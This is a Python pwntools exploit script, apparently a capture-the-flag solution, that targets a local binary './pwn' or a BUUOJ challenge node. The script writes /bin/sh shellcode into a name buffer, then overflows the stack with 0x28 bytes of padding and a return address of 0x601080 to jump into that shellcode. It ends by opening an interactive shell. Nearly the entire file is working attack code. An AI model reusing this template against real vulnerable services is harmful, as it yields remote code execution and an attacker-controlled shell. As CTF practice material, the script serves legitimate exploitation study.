from pwn import * 
from pwn import p64


debug = 1
gdb_is = 1
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./pwn")
else:
    host = "node4.buuoj.cn"
    r = connect(host,29238)#远程连接
    gdb_is =0

if gdb_is:
    # gdb.attach(r,'b* 0x4012ed')
    gdb.attach(r)
    pause()
    pass

# libc = ELF('./libc-2.31.so')
# elf = ELF('./vuln')

# r.sendlineafter()
r.sendafter(b'name',asm(shellcraft.sh()))

r.recvuntil("?\n")
payload = b'A'*0x20 + b'junkjunk' + p64(0x601080)
r.sendline(payload)
# r.recvuntil()
r.interactive()
